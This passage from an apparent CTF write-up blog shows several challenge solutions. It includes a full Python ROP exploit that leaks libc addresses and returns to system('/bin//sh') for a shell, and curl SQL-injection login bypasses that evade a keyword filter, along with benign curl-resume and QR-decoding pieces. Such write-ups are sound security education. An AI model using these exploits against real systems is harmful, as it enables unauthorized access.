<p>So exploiting it should be relatively easy. The binary itself contains very little useable gadgets. We can defeat ASLR by leaking function addresses. There is, however, the problem of finding the correct libc <em>version</em>. This took us some time to figure out, but luckily Swappage found an <a href="https://github.com/niklasb/libc-database">offline tool to identify libc</a>. It was <code>libc6_2.19-0ubuntu6.6_i386</code>. Another nice tool to identify libc is <a href="http://libcdb.com">libcdb.com</a>. After identifying the right libc version, we could find all the necessary gadgets via <a href="http://ropshell.com">ropshell.com</a>. Our plan was to <code>mprotect()</code> a certain region of memory as RWX, then <code>read()</code> in some shellcode and return to it.</p>

<p>Now, the plan fell through. For some reason, the <code>read()</code> syscall to read in the shellcode failed. Instead, I switched the exploit around a bit. We have access to <code>system()</code>, so I set up a ROP chain to <code>mprotect()</code> the first 0x1000 bytes of libc as RWX. Then, I wrote out the string <code>/bin//sh</code> to memory. At this point, it was getting late and I could have just as easily written out <code>/bin/sh,0</code> to memory&hellip; Finally, returning to <code>system("/bin//sh")</code> spawned a shell, allowing us to read the flag!</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
<span class='line-number'>72</span>
<span class='line-number'>73</span>
<span class='line-number'>74</span>
<span class='line-number'>75</span>
<span class='line-number'>76</span>
<span class='line-number'>77</span>
<span class='line-number'>78</span>
<span class='line-number'>79</span>
<span class='line-number'>80</span>
<span class='line-number'>81</span>
<span class='line-number'>82</span>
<span class='line-number'>83</span>
<span class='line-number'>84</span>
<span class='line-number'>85</span>
<span class='line-number'>86</span>
<span class='line-number'>87</span>
<span class='line-number'>88</span>
<span class='line-number'>89</span>
<span class='line-number'>90</span>
<span class='line-number'>91</span>
<span class='line-number'>92</span>
<span class='line-number'>93</span>
<span class='line-number'>94</span>
<span class='line-number'>95</span>
<span class='line-number'>96</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="kn">import</span> <span class="nn">socket</span><span class="o">,</span> <span class="nn">struct</span><span class="o">,</span> <span class="nn">re</span><span class="o">,</span> <span class="nn">time</span>
</span><span class='line'>
</span><span class='line'><span class="k">def</span> <span class="nf">p</span><span class="p">(</span><span class="n">x</span><span class="p">):</span>
</span><span class='line'>  <span class="k">return</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s">&#39;&lt;Q&#39;</span><span class="p">,</span> <span class="n">x</span><span class="p">)</span>
</span><span class='line'>  
</span><span class='line'><span class="k">def</span> <span class="nf">get_function</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="n">name</span><span class="p">):</span>
</span><span class='line'>  <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&#39;2</span><span class="se">\n</span><span class="s">&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">name</span><span class="o">+</span><span class="s">&#39;</span><span class="se">\n</span><span class="s">&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.50</span><span class="p">)</span>
</span><span class='line'>  <span class="n">data</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1000</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">m</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">findall</span><span class="p">(</span><span class="s">&#39;(0x0000.*)&#39;</span><span class="p">,</span> <span class="n">data</span><span class="p">)</span>
</span><span class='line'>  <span class="k">print</span> <span class="n">m</span>
</span><span class='line'>  <span class="k">return</span> <span class="nb">int</span><span class="p">(</span><span class="n">m</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="mi">16</span><span class="p">)</span>
</span><span class='line'>  
</span><span class='line'><span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
</span><span class='line'><span class="c">#s.connect((&#39;localhost&#39;, 4000))</span>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="s">&#39;r0pbaby_542ee6516410709a1421141501f03760.quals.shallweplayaga.me&#39;</span><span class="p">,</span> <span class="mi">10436</span><span class="p">))</span>
</span><span class='line'>
</span><span class='line'><span class="k">print</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1000</span><span class="p">)</span>
</span><span class='line'><span class="k">print</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1000</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="c"># get some address where we&#39;ll store the shellcode</span>
</span><span class='line'><span class="n">SYSTEM</span> <span class="o">=</span> <span class="n">get_function</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="s">&quot;system&quot;</span><span class="p">)</span>
</span><span class='line'><span class="n">READ</span> <span class="o">=</span> <span class="n">get_function</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="s">&quot;read&quot;</span><span class="p">)</span>
</span><span class='line'><span class="n">MPROTECT</span> <span class="o">=</span> <span class="n">get_function</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="s">&quot;mprotect&quot;</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="c"># this offset was found like so:</span>
</span><span class='line'><span class="c"># $ nm -D ./libc-2.19.so |grep mprotect</span>
</span><span class='line'><span class="c"># 00000000000f4a20 W mprotect</span>
</span><span class='line'><span class="n">LIBC_BASE</span> <span class="o">=</span> <span class="n">MPROTECT</span> <span class="o">-</span> <span class="mh">0xf4a20</span>
</span><span class='line'>
</span><span class='line'><span class="k">print</span> <span class="s">&quot;[!] libc_base  = 0x</span><span class="si">%X</span><span class="s">&quot;</span> <span class="o">%</span> <span class="n">LIBC_BASE</span>
</span><span class='line'><span class="k">print</span> <span class="s">&quot;[!] system()   = 0x</span><span class="si">%X</span><span class="s">&quot;</span> <span class="o">%</span> <span class="n">SYSTEM</span>
</span><span class='line'><span class="k">print</span> <span class="s">&quot;[!] read()     = 0x</span><span class="si">%X</span><span class="s">&quot;</span> <span class="o">%</span> <span class="n">READ</span>
</span><span class='line'><span class="k">print</span> <span class="s">&quot;[!] mprotect() = 0x</span><span class="si">%X</span><span class="s">&quot;</span> <span class="o">%</span> <span class="n">MPROTECT</span>
</span><span class='line'>
</span><span class='line'><span class="n">POPRDX</span> <span class="o">=</span> <span class="n">LIBC_BASE</span> <span class="o">+</span> <span class="mh">0x000bcee0</span>
</span><span class='line'><span class="n">POPRAX</span> <span class="o">=</span> <span class="n">LIBC_BASE</span> <span class="o">+</span> <span class="mh">0x00048858</span>
</span><span class='line'><span class="n">POPRSI</span> <span class="o">=</span> <span class="n">LIBC_BASE</span> <span class="o">+</span> <span class="mh">0x00024805</span>
</span><span class='line'><span class="n">POPRDI</span> <span class="o">=</span> <span class="n">LIBC_BASE</span> <span class="o">+</span> <span class="mh">0x00022b1a</span>
</span><span class='line'><span class="n">SYSCAL</span> <span class="o">=</span> <span class="n">LIBC_BASE</span> <span class="o">+</span> <span class="mh">0x000c1e55</span>
</span><span class='line'><span class="n">MOVMEM</span> <span class="o">=</span> <span class="n">LIBC_BASE</span> <span class="o">+</span> <span class="mh">0x0002fa03</span> <span class="c">#: mov [rax], rdx; ret</span>
</span><span class='line'>
</span><span class='line'><span class="c"># kick off ROP chain</span>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&#39;3</span><span class="se">\n</span><span class="s">&#39;</span><span class="p">)</span>
</span><span class='line'><span class="k">print</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1000</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'><span class="c"># build ROP chain</span>
</span><span class='line'><span class="c"># first, mprotect() a certain area</span>
</span><span class='line'><span class="n">payload</span> <span class="o">=</span> <span class="s">&quot;A&quot;</span><span class="o">*</span><span class="mi">8</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="n">POPRDX</span><span class="p">)</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mi">7</span><span class="p">)</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="n">POPRSI</span><span class="p">)</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x1000</span><span class="p">)</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="n">POPRDI</span><span class="p">)</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="n">LIBC_BASE</span><span class="p">)</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="n">POPRAX</span><span class="p">)</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mi">10</span><span class="p">)</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="n">SYSCAL</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="c"># secondly, write &#39;/bin&#39; to memory via MOVMEM gadget</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="n">POPRDX</span><span class="p">)</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x6e69622f</span><span class="p">)</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="n">POPRAX</span><span class="p">)</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="n">LIBC_BASE</span><span class="p">)</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="n">MOVMEM</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="c"># thirdly, write &#39;//sh&#39; to memory</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="n">POPRDX</span><span class="p">)</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x68732f2f</span><span class="p">)</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="n">POPRAX</span><span class="p">)</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="n">LIBC_BASE</span><span class="o">+</span><span class="mi">4</span><span class="p">)</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="n">MOVMEM</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="c"># finally, return-to-system and invoke a shell</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="n">POPRDI</span><span class="p">)</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="n">LIBC_BASE</span><span class="p">)</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="n">SYSTEM</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="n">length</span> <span class="o">=</span> <span class="s">&quot;</span><span class="si">%d</span><span class="s">&quot;</span> <span class="o">%</span> <span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span><span class="o">+</span><span class="mi">1</span><span class="p">)</span>
</span><span class='line'><span class="k">print</span> <span class="s">&quot;[!] sending &quot;</span> <span class="o">+</span> <span class="n">length</span> <span class="o">+</span> <span class="s">&quot; bytes&quot;</span>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">length</span> <span class="o">+</span> <span class="s">&#39;</span><span class="se">\n</span><span class="s">&#39;</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.5</span><span class="p">)</span>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span> <span class="o">+</span> <span class="s">&#39;</span><span class="se">\n</span><span class="s">&#39;</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="k">print</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1000</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="c"># interact with the shell</span>
</span><span class='line'><span class="kn">import</span> <span class="nn">telnetlib</span>
</span><span class='line'><span class="n">t</span> <span class="o">=</span> <span class="n">telnetlib</span><span class="o">.</span><span class="n">Telnet</span><span class="p">()</span>
</span><span class='line'><span class="n">t</span><span class="o">.</span><span class="n">sock</span> <span class="o">=</span> <span class="n">s</span>
</span><span class='line'><span class="n">t</span><span class="o">.</span><span class="n">interact</span><span class="p">()</span>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</span></code></pre></td></tr></table></div></figure>


<p>Putting it all together:</p>

<p><img src="http://barrebas.github.io/assets/legitbs/r0pbaby.png" alt="" /></p>

<p>This was an easy one, but still took me a while to get back into binary exploitation. Especially getting the correct libc version took longer than necessary and my thanks go out to Swappage for persisting and finding the correct version!</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Backdoor CTF - Judge]]></title>
    <link href="http://barrebas.github.io/blog/2015/04/02/backdoor-ctf-judge/"/>
    <updated>2015-04-02T20:10:52+02:00</updated>
    <id>http://barrebas.github.io/blog/2015/04/02/backdoor-ctf-judge</id>
    <content type="html"><![CDATA[<p>A web challenge! For 100 points, we we&rsquo;re asked to log in as <code>admin</code>.</p>

<!-- more -->


<p>Pointing a browser to the challenge site gave us the option to login, or register. I decided to register <code>testz0r:testz0r</code> and logged in. The login then asked me to login as admin. Well, I had no password for admin. I went back to the register page, thinking there was a SQLi there. That might allow me to inject into the INSERT INTO statement and update the admin&rsquo;s password. Alas, no dice.</p>

<p>I again fired up <code>curl</code> and tried to get some SQLi going on the login form.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>curl http://hack.bckdr.in/JUDGE/index.php --data <span class="s2">&quot;username=testz0r&#39; or &#39;a&#39;=&#39;a&amp;password=testz0r&quot;</span>
</span><span class='line'>&lt;!DOCTYPE html&gt;
</span><span class='line'>
</span><span class='line'>&lt;html&gt;
</span><span class='line'>
</span><span class='line'>&lt;head&gt;
</span><span class='line'>&lt;title&gt;Login&lt;/title&gt;
</span><span class='line'>&lt;/head&gt;
</span><span class='line'>
</span><span class='line'>&lt;body&gt;
</span><span class='line'>An Error occured
</span></code></pre></td></tr></table></div></figure>


<p>After messing around for a while, I remembered that sometimes, keywords like <code>OR</code> and <code>AND</code> are filtered. I tried to substitute <code>OR</code> for <code>||</code> and whadda-ya-know:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">$ </span>curl http://hack.bckdr.in/JUDGE/index.php --data <span class="s2">&quot;username=admin&#39;||&#39;1&amp;password=testz0r&quot;</span>
</span><span class='line'>&lt;!DOCTYPE html&gt;
</span><span class='line'>
</span><span class='line'>&lt;html&gt;
</span><span class='line'>
</span><span class='line'>&lt;head&gt;
</span><span class='line'>&lt;title&gt;Login&lt;/title&gt;
</span><span class='line'>&lt;/head&gt;
</span><span class='line'>
</span><span class='line'>&lt;body&gt;
</span><span class='line'>Flag is <span class="o">[</span>REDACTED<span class="o">]</span>
</span></code></pre></td></tr></table></div></figure>


<p>Done! One filter bypass was all it took.</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Backdoor CTF - LHC]]></title>
    <link href="http://barrebas.github.io/blog/2015/04/02/backdoor-ctf-lhc/"/>
    <updated>2015-04-02T19:59:55+02:00</updated>
    <id>http://barrebas.github.io/blog/2015/04/02/backdoor-ctf-lhc</id>
    <content type="html"><![CDATA[<p><code>LHC</code> was a short &amp; sweet challenge in Backdoor CTF. It had a nice &lsquo;aha-Erlebnis&rsquo; moment.</p>

<!-- more -->


<p>During the CTF, the organizers dropped this challenge. The description mentioned that the flag was hidden in a data file. This data file was kindly provided by the Large Hadron Collider and was 2049 GB large.</p>

<p>I&rsquo;ll let that sink in.</p>

<p>Two-thousand and forty nine <strong>gigabytes</strong>. Downloading it would take more than twenty days. The flag was in the middle of the file, but that still meant downloading more than a terabyte of data.</p>

<p>I fired up <code>curl</code> and looked at the download:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>bas@tritonal:~/tmp/bckdr/medusa$ curl -vvv https://lhc-cdn.herokuapp.com/data.txt &gt; /dev/null
</span><span class='line'>* About to connect() to lhc-cdn.herokuapp.com port 443 (#0)
</span><span class='line'>*   Trying 107.21.223.88...
</span><span class='line'>...snip...
</span><span class='line'>&gt; GET /data.txt HTTP/1.1
</span><span class='line'>&gt; User-Agent: curl/7.26.0
</span><span class='line'>&gt; Host: lhc-cdn.herokuapp.com
</span><span class='line'>&gt; Accept: */*
</span><span class='line'>&gt; 
</span><span class='line'>* additional stuff not fine transfer.c:1037: 0 0
</span><span class='line'>* HTTP 1.1 or later with persistent connection, pipelining supported
</span><span class='line'>&lt; HTTP/1.1 200 OK
</span><span class='line'>&lt; Server: Cowboy
</span><span class='line'>&lt; Connection: keep-alive
</span><span class='line'>&lt; X-Powered-By: Express
</span><span class='line'>&lt; Accept-Ranges: bytes
</span><span class='line'>&lt; Content-Type: text/plain; charset=utf-8
</span><span class='line'>&lt; Content-Length: 2200000000000
</span><span class='line'>&lt; Date: Wed, 01 Apr 2015 21:44:48 GMT
</span><span class='line'>&lt; Via: 1.1 vegur</span></code></pre></td></tr></table></div></figure>


<p>Yup, 2200000000000 bytes of data. But wait! <code>curl</code> has the option to resume a broken download; that meant that I could control where the download would start. I issued this command and started searching the output for the flag:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">$ </span>curl -vvv https://lhc-cdn.herokuapp.com/data.txt -C <span class="m">1100000000000</span> &gt; lhc-middle
</span><span class='line'>...snip...
</span><span class='line'><span class="nv">$ </span>strings -n <span class="m">20</span> ./lhc-middle
</span></code></pre></td></tr></table></div></figure>


<p>This gave me part of the flag; the description said it was in the middle of the datafile, so I subtracted another 1000 bytes:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">$ </span>curl -vvv https://lhc-cdn.herokuapp.com/data.txt -C <span class="m">1099999998999</span> &gt; lhc-middle
</span><span class='line'><span class="nv">$ </span>strings lhc-middle -n 20
</span><span class='line'>              The flag is: <span class="o">[</span>REDACTED<span class="o">]</span>
</span></code></pre></td></tr></table></div></figure>


<p>Simple, really, once you know the trick.</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Backdoor CTF - QR]]></title>
    <link href="http://barrebas.github.io/blog/2015/04/02/backdoor-ctf-qr/"/>
    <updated>2015-04-02T19:43:08+02:00</updated>
    <id>http://barrebas.github.io/blog/2015/04/02/backdoor-ctf-qr</id>
    <content type="html"><![CDATA[<p>For this challenge, we had to decode a ton of QR images given to us via a <code>nc</code> connection for 70 points. Sounds like fun!</p>

<!-- more -->


<p>Upon connecting to the service, it tells us we need to decode as much flags as we can. We also get the first flag.</p>

<p><img src="http://barrebas.github.io/assets/bckdr/qr-00.png" alt="" />
Right, so I turned to the solution to <a href="https://ctf-team.vulnhub.com/advent-ctf-2014-qr-garden/">QR Garden by Swappage</a>. I liked his approach and decided to do something similar. I installed <code>zbar</code> on my box and cobbled together a python script. That script would connect to the QR service, write out the QR code to disk using <code>PIL</code> and then call <code>zbarimg</code> to decode the QR code. I had some issues at the start because I mixed up the colors of the QR code, but then I was decoding them all pretty rapidly.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="kn">from</span> <span class="nn">socket</span> <span class="kn">import</span> <span class="o">*</span>
</span><span class='line'><span class="kn">from</span> <span class="nn">PIL</span> <span class="kn">import</span> <span class="n">Image</span>
</span><span class='line'><span class="kn">from</span> <span class="nn">os</span> <span class="kn">import</span> <span class="n">popen</span>
</span><span class='line'><span class="kn">import</span> <span class="nn">re</span><span class="o">,</span> <span class="nn">time</span><span class="o">,</span> <span class="nn">telnetlib</span>
</span><span class='line'>
</span><span class='line'><span class="k">def</span> <span class="nf">readtil</span><span class="p">(</span><span class="n">delim</span><span class="p">):</span>
</span><span class='line'>  <span class="n">buf</span> <span class="o">=</span> <span class="n">b</span><span class="s">&#39;&#39;</span>
</span><span class='line'>  <span class="k">while</span> <span class="ow">not</span> <span class="n">delim</span> <span class="ow">in</span> <span class="n">buf</span><span class="p">:</span>
</span><span class='line'>      <span class="n">buf</span> <span class="o">+=</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
</span><span class='line'>  <span class="k">return</span> <span class="n">buf</span>
</span><span class='line'>
</span><span class='line'><span class="k">def</span> <span class="nf">sendln</span><span class="p">(</span><span class="n">b</span><span class="p">):</span>
</span><span class='line'>  <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">b</span> <span class="o">+</span> <span class="n">b</span><span class="s">&#39;</span><span class="se">\n</span><span class="s">&#39;</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="k">def</span> <span class="nf">getQR</span><span class="p">(</span><span class="n">qr</span><span class="p">):</span>
</span><span class='line'>  <span class="n">im</span> <span class="o">=</span> <span class="n">Image</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="s">&quot;RGB&quot;</span><span class="p">,</span> <span class="p">(</span><span class="mi">94</span><span class="p">,</span> <span class="mi">94</span><span class="p">),</span> <span class="s">&#39;white&#39;</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">pixels</span> <span class="o">=</span> <span class="n">im</span><span class="o">.</span><span class="n">load</span><span class="p">()</span>
</span><span class='line'>  <span class="k">print</span> <span class="nb">len</span><span class="p">(</span><span class="n">qr</span><span class="p">)</span>
</span><span class='line'>  <span class="n">y</span> <span class="o">=</span> <span class="mi">0</span>
</span><span class='line'>  <span class="n">x</span> <span class="o">=</span> <span class="mi">0</span>
</span><span class='line'>  <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span>
</span><span class='line'>  <span class="k">while</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="nb">len</span><span class="p">(</span><span class="n">qr</span><span class="p">):</span>
</span><span class='line'>      <span class="k">if</span> <span class="nb">ord</span><span class="p">(</span><span class="n">qr</span><span class="p">[</span><span class="n">i</span><span class="p">])</span> <span class="o">==</span> <span class="mh">0xe2</span><span class="p">:</span>
</span><span class='line'>          <span class="n">pixels</span><span class="p">[</span><span class="n">x</span><span class="p">,</span><span class="n">y</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>
</span><span class='line'>          <span class="n">pixels</span><span class="p">[</span><span class="n">x</span><span class="p">,</span><span class="n">y</span><span class="o">+</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>
